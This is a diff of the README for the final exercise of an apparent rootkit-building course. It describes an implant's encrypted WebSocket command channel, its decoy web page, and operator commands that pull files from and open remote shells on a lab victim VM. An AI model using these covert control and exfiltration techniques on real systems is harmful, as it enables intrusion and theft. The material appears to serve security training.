@@ -6,8 +6,7 @@ This is it.
 
 Thirty exercises built a Linux rootkit from an empty kernel module to a remotely
 operated implant. P00 is the final assessment: operate the finished system end
-to end, through the
-real interfaces, and prove every mechanism holds.
+to end, through the real interfaces, and prove every mechanism holds.
 
 There is no code to write.
 
@@ -35,18 +34,17 @@ OPERATOR HOST                              TARGET VM
 
 The agent embeds two 32-byte X25519 keys: `keys/agent.key` (private) and
 `keys/operator.pub` (public). Both sides derive a shared AES-256-GCM key via
-ECDH. The encryption key and agent ID are derived independently via HKDF
-with separate labels (`rklings-aead` and `rklings-id`), so the ID leaks
-no key material.
+ECDH. The encryption key and agent ID are derived independently via HKDF with
+separate labels (`rklings-aead` and `rklings-id`), so the ID leaks no key
+material.
 
-The agent connects to the operator over WebSocket, authenticating with its
-agent ID and an encrypted hello frame:
+The agent connects to the operator over WebSocket, authenticating with its agent
+ID and an encrypted hello frame:
 
 - Commands and responses flow bidirectionally over the persistent connection
   with per-frame AEAD encryption
 - Unrecognized HTTP requests receive a decoy HTML page
-- No runtime handshake beyond the initial hello, no external crypto
-  dependencies
+- No runtime handshake beyond the initial hello, no external crypto dependencies
 
 ## What you built
 
@@ -110,8 +108,8 @@ exercises/P00-complete-rootkit
     └── Kbuild
 ```
 
-Every file is a supplied, read-only product artifact.
-The operator lives in `product/operator`.
+Every file is a supplied, read-only product artifact. The operator lives in
+`product/operator`.
 
 ## Test it
 
@@ -130,8 +128,8 @@ root@victim:~# /rklings/rklings_agent &
 $ ./rklings serve P00
 ```
 
-The agent connects over WebSocket with AEAD encryption.
-The terminal prompt appears; the dashboard is live at `http://127.0.0.1:8080`.
+The agent connects over WebSocket with AEAD encryption. The terminal prompt
+appears; the dashboard is live at `http://127.0.0.1:8080`.
 
 ## Operate it
 
@@ -151,8 +149,8 @@ victim-17def67e > download /etc/hostname
 saved 7 bytes -> .rklings/downloads/victim-17def67e/etc/hostname
 ```
 
-`shell` opens a persistent PTY; `Ctrl+]` returns to the operator.
-With multiple victims, `agents` lists them and `use <id>` selects one.
+`shell` opens a persistent PTY; `Ctrl+]` returns to the operator. With multiple
+victims, `agents` lists them and `use <id>` selects one.
 
 ## Prove persistence
 
